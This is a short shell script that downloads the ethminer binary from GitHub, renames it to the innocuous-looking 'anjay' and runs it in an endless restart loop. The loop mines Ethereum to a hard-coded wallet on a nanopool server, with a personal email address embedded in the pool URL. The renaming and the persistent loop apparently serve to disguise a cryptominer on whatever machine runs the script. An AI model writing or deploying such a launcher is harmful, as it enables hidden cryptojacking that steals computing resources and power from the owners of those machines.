#!/bin/sh
sudo apt-get update
wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
tar xf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
cd bin
mv ethminer anjay
chmod u+x anjay
while [ 1 ]; do
./anjay -P stratum2+tcp://0x1af0e85fcba658c12fb134fc570f3c2ac0e52552@eth-asia1.nanopool.org:9999/python/aris.aojr%40gmail.com
sleep 10
done
